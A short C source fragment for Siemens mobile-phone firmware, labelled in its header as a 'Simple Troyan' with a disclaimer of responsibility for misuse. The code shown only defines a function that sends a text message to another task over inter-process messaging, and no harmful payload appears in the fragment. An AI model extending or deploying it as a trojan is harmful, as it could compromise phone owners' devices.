#include "..\inc\swilib.h"
#include "../inc/xtask_ipc.h"
//=======================================================================//
//                     Simple Troyan   (NSG,ELKA)                        //
//                             (c)Evilfox                                //
//  Author dont use it and do not answer about that how others used it   //
//=======================================================================//
extern const char ipc_my_name[];
const char ipc_send_name[]="MioSD";
//const char percent_d[]="%d";

#define IPC_SENDMSG_TXT 55

IPC_REQ tmr_gipc2;

void send_message(char *sended)
{
  tmr_gipc2.name_to=ipc_send_name;
  tmr_gipc2.name_from=ipc_my_name;
  tmr_gipc2.data=sended;
  GBS_SendMessage(MMI_CEPID,MSG_IPC,IPC_SENDMSG_TXT,&tmr_gipc2);
}


